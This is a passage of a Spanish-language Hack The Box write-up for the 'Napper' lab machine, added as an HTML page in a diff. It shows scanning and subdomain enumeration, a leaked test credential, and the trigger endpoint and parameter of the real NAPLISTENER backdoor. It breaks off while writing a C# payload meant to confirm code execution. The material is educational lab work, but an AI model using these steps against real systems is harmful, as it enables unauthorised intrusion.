@@ -1,0 +1,1166 @@
+<!doctype html>
+<html lang="es">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="/pointed.png" />
+
+<title>Hack The Box: Napper Writeup | Hard&nbsp;|&nbsp;Bajo el Teclado</title>
+<meta
+  name="title"
+  content="Hack The Box: Napper Writeup | Hard"
+/>
+<meta
+  name="description"
+  content="Hack The Box: Napper Writeup
+Welcome to my detailed writeup of the hard difficulty machine &ldquo;Napper&rdquo; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration
+
+
+
+
+
+
+1$ rustscan -a 10.129.229.166 --ulimit 5000 -g
+210.129.229.166 -&gt; [80,443,7680]
+
+
+
+
+
+
+
+ 1$ nmap -p80,443,7680 -sCV 10.129.229.166 -oN allPorts
+ 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:48 CEST
+ 3Nmap scan report for 10.129.229.166
+ 4Host is up (0.036s latency).
+ 5
+ 6PORT     STATE    SERVICE   VERSION
+ 780/tcp   open     http      Microsoft IIS httpd 10.0
+ 8|_http-title: Did not follow redirect to https://app.napper.htb
+ 9|_http-server-header: Microsoft-IIS/10.0
+10443/tcp  open     ssl/http  Microsoft IIS httpd 10.0
+11|_http-generator: Hugo 0.112.3
+12|_ssl-date: 2024-08-27T12:48:39&#43;00:00; -1h59m59s from scanner time.
+13| tls-alpn: 
+14|_  http/1.1
+15| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
+16| Subject Alternative Name: DNS:app.napper.htb
+17| Not valid before: 2023-06-07T14:58:55
+18|_Not valid after:  2033-06-04T14:58:55
+19|_http-server-header: Microsoft-IIS/10.0
+20| http-methods: 
+21|_  Potentially risky methods: TRACE
+22|_http-title: Research Blog | Home 
+237680/tcp filtered pando-pub
+24Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+25
+26Host script results:
+27|_clock-skew: -1h59m59s
+28
+29Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+30Nmap done: 1 IP address (1 host up) scanned in 23.31 seconds
+
+UDP Enumeration
+
+
+
+
+
+
+1$ sudo nmap --top-ports 1500 -sU --min-rate 1500 -n -Pn 10.129.229.166 -oN ../Desktop/napper/scan/allPorts.UDP
+2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:47 CEST
+3Nmap scan report for 10.129.229.166
+4Host is up.
+5All 1500 scanned ports on 10.129.229.166 are in ignored states.
+6Not shown: 1500 open|filtered udp ports (no-response)
+7
+8Nmap done: 1 IP address (1 host up) scanned in 3.19 seconds
+
+HTTPS Enumeration
+Ya que el sitio web es HTTPS, vamos a inspeccionar primero el certificado TLS."
+/>
+<meta
+  name="keywords"
+  content="HackTheBox,Napper,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,RCE,Exploit,Windows,HTTPS Enumeration,SSL Certificate Inspection,Information Leakage,NAPLISTENER,Rerverse Port Forwarding,ElasticDB Enumeration,Reversing Engineering,Reversing,GHidra,Go Scripting,Python Scripting,Scripting,Decrypting,"
+/>
+
+  <meta name="author" content="Andrés Del Cerro" />
+
+
+
+
+<meta property="og:url" content="http://localhost:1313/writeups/napper---hackthebox/">
+  <meta property="og:site_name" content="Bajo el Teclado">
+  <meta property="og:title" content="Hack The Box: Napper Writeup | Hard">
+  <meta property="og:description" content="Hack The Box: Napper Writeup Welcome to my detailed writeup of the hard difficulty machine “Napper” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration 1$ rustscan -a 10.129.229.166 --ulimit 5000 -g 210.129.229.166 -&gt; [80,443,7680] 1$ nmap -p80,443,7680 -sCV 10.129.229.166 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:48 CEST 3Nmap scan report for 10.129.229.166 4Host is up (0.036s latency). 5 6PORT STATE SERVICE VERSION 780/tcp open http Microsoft IIS httpd 10.0 8|_http-title: Did not follow redirect to https://app.napper.htb 9|_http-server-header: Microsoft-IIS/10.0 10443/tcp open ssl/http Microsoft IIS httpd 10.0 11|_http-generator: Hugo 0.112.3 12|_ssl-date: 2024-08-27T12:48:39&#43;00:00; -1h59m59s from scanner time. 13| tls-alpn: 14|_ http/1.1 15| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US 16| Subject Alternative Name: DNS:app.napper.htb 17| Not valid before: 2023-06-07T14:58:55 18|_Not valid after: 2033-06-04T14:58:55 19|_http-server-header: Microsoft-IIS/10.0 20| http-methods: 21|_ Potentially risky methods: TRACE 22|_http-title: Research Blog | Home 237680/tcp filtered pando-pub 24Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 25 26Host script results: 27|_clock-skew: -1h59m59s 28 29Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 30Nmap done: 1 IP address (1 host up) scanned in 23.31 seconds UDP Enumeration 1$ sudo nmap --top-ports 1500 -sU --min-rate 1500 -n -Pn 10.129.229.166 -oN ../Desktop/napper/scan/allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:47 CEST 3Nmap scan report for 10.129.229.166 4Host is up. 5All 1500 scanned ports on 10.129.229.166 are in ignored states. 6Not shown: 1500 open|filtered udp ports (no-response) 7 8Nmap done: 1 IP address (1 host up) scanned in 3.19 seconds HTTPS Enumeration Ya que el sitio web es HTTPS, vamos a inspeccionar primero el certificado TLS.">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-08-27T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-08-27T00:00:00+00:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Napper">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Penetration Testing">
+    <meta property="article:tag" content="CTF">
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hack The Box: Napper Writeup | Hard">
+  <meta name="twitter:description" content="Hack The Box: Napper Writeup Welcome to my detailed writeup of the hard difficulty machine “Napper” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration 1$ rustscan -a 10.129.229.166 --ulimit 5000 -g 210.129.229.166 -&gt; [80,443,7680] 1$ nmap -p80,443,7680 -sCV 10.129.229.166 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:48 CEST 3Nmap scan report for 10.129.229.166 4Host is up (0.036s latency). 5 6PORT STATE SERVICE VERSION 780/tcp open http Microsoft IIS httpd 10.0 8|_http-title: Did not follow redirect to https://app.napper.htb 9|_http-server-header: Microsoft-IIS/10.0 10443/tcp open ssl/http Microsoft IIS httpd 10.0 11|_http-generator: Hugo 0.112.3 12|_ssl-date: 2024-08-27T12:48:39&#43;00:00; -1h59m59s from scanner time. 13| tls-alpn: 14|_ http/1.1 15| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US 16| Subject Alternative Name: DNS:app.napper.htb 17| Not valid before: 2023-06-07T14:58:55 18|_Not valid after: 2033-06-04T14:58:55 19|_http-server-header: Microsoft-IIS/10.0 20| http-methods: 21|_ Potentially risky methods: TRACE 22|_http-title: Research Blog | Home 237680/tcp filtered pando-pub 24Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 25 26Host script results: 27|_clock-skew: -1h59m59s 28 29Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 30Nmap done: 1 IP address (1 host up) scanned in 23.31 seconds UDP Enumeration 1$ sudo nmap --top-ports 1500 -sU --min-rate 1500 -n -Pn 10.129.229.166 -oN ../Desktop/napper/scan/allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:47 CEST 3Nmap scan report for 10.129.229.166 4Host is up. 5All 1500 scanned ports on 10.129.229.166 are in ignored states. 6Not shown: 1500 open|filtered udp ports (no-response) 7 8Nmap done: 1 IP address (1 host up) scanned in 3.19 seconds HTTPS Enumeration Ya que el sitio web es HTTPS, vamos a inspeccionar primero el certificado TLS.">
+
+
+
+
+
+  <meta itemprop="name" content="Hack The Box: Napper Writeup | Hard">
+  <meta itemprop="description" content="Hack The Box: Napper Writeup Welcome to my detailed writeup of the hard difficulty machine “Napper” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration 1$ rustscan -a 10.129.229.166 --ulimit 5000 -g 210.129.229.166 -&gt; [80,443,7680] 1$ nmap -p80,443,7680 -sCV 10.129.229.166 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:48 CEST 3Nmap scan report for 10.129.229.166 4Host is up (0.036s latency). 5 6PORT STATE SERVICE VERSION 780/tcp open http Microsoft IIS httpd 10.0 8|_http-title: Did not follow redirect to https://app.napper.htb 9|_http-server-header: Microsoft-IIS/10.0 10443/tcp open ssl/http Microsoft IIS httpd 10.0 11|_http-generator: Hugo 0.112.3 12|_ssl-date: 2024-08-27T12:48:39&#43;00:00; -1h59m59s from scanner time. 13| tls-alpn: 14|_ http/1.1 15| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US 16| Subject Alternative Name: DNS:app.napper.htb 17| Not valid before: 2023-06-07T14:58:55 18|_Not valid after: 2033-06-04T14:58:55 19|_http-server-header: Microsoft-IIS/10.0 20| http-methods: 21|_ Potentially risky methods: TRACE 22|_http-title: Research Blog | Home 237680/tcp filtered pando-pub 24Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 25 26Host script results: 27|_clock-skew: -1h59m59s 28 29Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 30Nmap done: 1 IP address (1 host up) scanned in 23.31 seconds UDP Enumeration 1$ sudo nmap --top-ports 1500 -sU --min-rate 1500 -n -Pn 10.129.229.166 -oN ../Desktop/napper/scan/allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:47 CEST 3Nmap scan report for 10.129.229.166 4Host is up. 5All 1500 scanned ports on 10.129.229.166 are in ignored states. 6Not shown: 1500 open|filtered udp ports (no-response) 7 8Nmap done: 1 IP address (1 host up) scanned in 3.19 seconds HTTPS Enumeration Ya que el sitio web es HTTPS, vamos a inspeccionar primero el certificado TLS.">
+  <meta itemprop="datePublished" content="2024-08-27T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-08-27T00:00:00+00:00">
+  <meta itemprop="wordCount" content="3526">
+  <meta itemprop="keywords" content="HackTheBox,Napper,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,RCE,Exploit,Windows,HTTPS Enumeration,SSL Certificate Inspection,Information Leakage,NAPLISTENER,Rerverse Port Forwarding,ElasticDB Enumeration,Reversing Engineering,Reversing,GHidra,Go Scripting,Python Scripting,Scripting,Decrypting">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+    
+    <link href="/simple.min.css" rel="stylesheet" />
+
+    
+    <link href="/style.min.css" rel="stylesheet" />
+
+    
+
+    
+</head>
+
+  <body>
+    <header>
+      <nav>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZHDKLM7DD2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-ZHDKLM7DD2');
+</script>
+
+
+  <a
+    href="/"
+    
+    >Home</a
+  >
+
+  <a
+    href="/about/"
+    
+    >About me</a
+  >
+
+  <a
+    href="/writeups/"
+    
+    >Writeup&#39;s</a
+  >
+
+
+</nav>
+<div style="display: flex; justify-content: center; align-items: center">
+  <div style="display: flex; width: 20rem; gap: 2rem;">
+    <img src="yo.png" alt="">
+    <h1>Hack The Box: Napper Writeup | Hard</h1>
+  </div>
+</div>
+
+
+    </header>
+    <main>
+      
+  
+  
+  <content>
+    <h1 id="hack-the-box-napper-writeup">Hack The Box: Napper Writeup</h1>
+<p>Welcome to my detailed writeup of the hard difficulty machine <strong>&ldquo;Napper&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.229.166 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.229.166 -&gt; [80,443,7680]
+</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ nmap -p80,443,7680 -sCV 10.129.229.166 -oN allPorts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:48 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report for 10.129.229.166
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.036s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#f00"></span>PORT     STATE    SERVICE   VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>80/tcp   open     http      Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>|_http-title: Did not follow redirect to https://app.napper.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>443/tcp  open     ssl/http  Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>|_http-generator: Hugo 0.112.3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>|_ssl-date: 2024-08-27T12:48:39+00:00; -1h59m59s from scanner time.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>|_  http/1.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>| Subject Alternative Name: DNS:app.napper.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>| Not valid before: 2023-06-07T14:58:55
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>|_Not valid after:  2033-06-04T14:58:55
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>| http-methods: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>|_http-title: Research Blog | Home 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>7680/tcp filtered pando-pub
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span><span style="color:#f00"></span>Host script results:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>|_clock-skew: -1h59m59s
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span><span style="color:#f00"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>Nmap done: 1 IP address (1 host up) scanned in 23.31 seconds
+</span></span></code></pre></div>
+<h1 id="udp-enumeration">UDP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU --min-rate <span style="color:#ff0;font-weight:bold">1500</span> -n -Pn 10.129.229.166 -oN ../Desktop/napper/scan/allPorts.UDP
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:47 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Nmap scan report for 10.129.229.166
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Host is up.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>All 1500 scanned ports on 10.129.229.166 are in ignored states.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>Not shown: 1500 open|filtered udp ports (no-response)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span><span style="color:#f00"></span>Nmap done: 1 IP address (1 host up) scanned in 3.19 seconds
+</span></span></code></pre></div>
+<h1 id="https-enumeration">HTTPS Enumeration</h1>
+<p>Ya que el sitio web es HTTPS, vamos a inspeccionar primero el certificado TLS.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ openssl s_client -showcerts -connect 10.129.229.166:443
+</span></span></code></pre></div>
+<p>De este análisis encontramos el dominio <code>napper.htb</code> y los subdominios <code>app.napper.htb</code>, <code>ca.napper.htb</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ whatweb https://napper.htb 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>https://napper.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.229.166], MetaGenerator[Hugo 0.112.3], Microsoft-IIS[10.0], Open-Graph-Protocol[website], Script[text/javascript,text/x-mathjax-config], Title[Research Blog | Home], X-UA-Compatible[IE=edge]
+</span></span></code></pre></div>
+<p><code>whatweb</code> nos reporta que es un blog hecho con Hugo (como este blog que estas leyendo ahora mismo) y que por detrás existe un IIS 10.0.</p>
+<h2 id="information-leakage">Information Leakage</h2>
+<p>Viendo los artículos del blog nos encontramos una credencial de prueba, nos la podemos apuntar por si acaso se le ha olvidado eliminarla.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>El caso es que no encontramos ningún sitio para autenticarnos.</p>
+<p>Después de fuzzear no encontramos nada.</p>
+<p>Buscando subdominios encontramos el subdominio <code>internal.napper.htb</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ wfuzz --hh=<span style="color:#ff0;font-weight:bold">5589</span> -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>txt -H &#39;Host: FUZZ.napper.htb&#39; https://napper.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>.....
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>000000387:   401        29 L     100 W      1293 Ch     &#34;internal&#34;
+</span></span></code></pre></div>
+<p>Nos pide autenticación&hellip;
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Y con <code>example:ExamplePassword</code> podemos autenticarnos y vemos un artículo que antes no era visible..
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<h2 id="exploiting-naplistener-backdoor---foothold">Exploiting NAPLISTENER Backdoor -&gt; Foothold</h2>
+<p>El artículo habla sobre el malware <code>NAPLISTENER</code></p>
+<blockquote>
+<p>HTTP listener written in C#, which we refer to as NAPLISTENER. Consistent with SIESTAGRAPH and other malware families developed or used by this threat, NAPLISTENER appears designed to evade network-based forms of detection.</p>
+</blockquote>
+<blockquote>
+<p>This means that any web request to /ews/MsExgHealthCheckd/ that contains a base64-encoded .NET assembly in the sdafwe3rwe23 parameter will be loaded and executed in memory. It&rsquo;s worth noting that the binary runs in a separate process and it is not associated with the running IIS server directly.</p>
+</blockquote>
+<p>El sitio web que esté &ldquo;backdoorizado&rdquo; podría ejecutar código .NET base64-encodeado en el endpoint <code>/ews/MsExgHealthCheckd/</code> por el parámetro <code>sdafwe3rwe23</code>.</p>
+<p>Hay que tener en cuenta que se ejecutará en un proceso distinto y no está asociado al servicio que esté ejecutando el servidor IIS.</p>
+<p>Podemos echar un ojo a <a href="https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph">este artículo de eslatic</a></p>
+<p>No encuentro que la ruta donde está el backdoor exista.
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p><img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Aunque puede que solo responda cuando un payload sea válido.</p>
+<p>Podemos crear un pequeño script en C# para mandarnos un ping a nuestra máquina.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">using</span> System;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#fff;font-weight:bold">using</span> System.Net.NetworkInformation;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#fff;font-weight:bold">namespace</span> PingTest
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>    <span style="color:#fff;font-weight:bold">class</span> Program
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>    {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>        <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> Main(<span style="color:#fff;font-weight:bold">string</span>[] args)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>        {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>            <span style="color:#fff;font-weight:bold">string</span> ipAddress = <span style="color:#0ff;font-weight:bold">&#34;10.10.14.125&#34;</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>            Ping pingSender = <span style="color:#fff;font-weight:bold">new</span> Ping();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>            PingReply reply = pingSender.Send(ipAddress);
